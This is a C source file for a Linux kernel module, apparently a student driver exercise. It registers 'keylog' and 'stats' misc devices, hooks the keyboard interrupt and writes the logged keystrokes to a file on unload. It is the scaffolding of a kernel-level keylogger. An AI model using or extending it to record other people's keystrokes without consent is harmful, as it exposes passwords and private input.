#include "keylog.h"

extern	struct miscdevice		keylog_dev;
extern	struct miscdevice		stats_dev;
extern	irqreturn_t keyboard_handler(int irq, void *dev_id);
extern struct file *file_open(const char *path, int flags, int rights);
extern void write_file(struct file *filp);

int ret_keylog;
int ret_stats;
int ret_irq;

static int __init keyboard_irq_init(void)
{
	ret_keylog = misc_register(&keylog_dev);
	if (ret_keylog < 0)
		return ret_keylog;
	ret_stats = misc_register(&stats_dev);
	if (ret_stats < 0)
		return ret_stats;
	ret_irq = request_irq(KEYBOARD_IRQ, keyboard_handler, IRQF_SHARED,
			      "keyboard", (void *)keyboard_handler);
	if (ret_irq < 0)
		return ret_irq;
	pr_info("keyboard init okay!\n");
	return 0;
}

static void __exit keyboard_irq_exit(void)
{
	struct file *filp = NULL;

	filp = file_open(FILENAME, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (filp)
		write_file(filp);
	if (!ret_keylog)
		misc_deregister(&keylog_dev);
	if (!ret_stats)
		misc_deregister(&stats_dev);
	if (!ret_irq)
		free_irq(KEYBOARD_IRQ, (void *)(keyboard_handler));
	pr_info("keyboard exit okay!\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("abonneca");
MODULE_DESCRIPTION("A keyboard irq module");

module_init(keyboard_irq_init);
module_exit(keyboard_irq_exit);
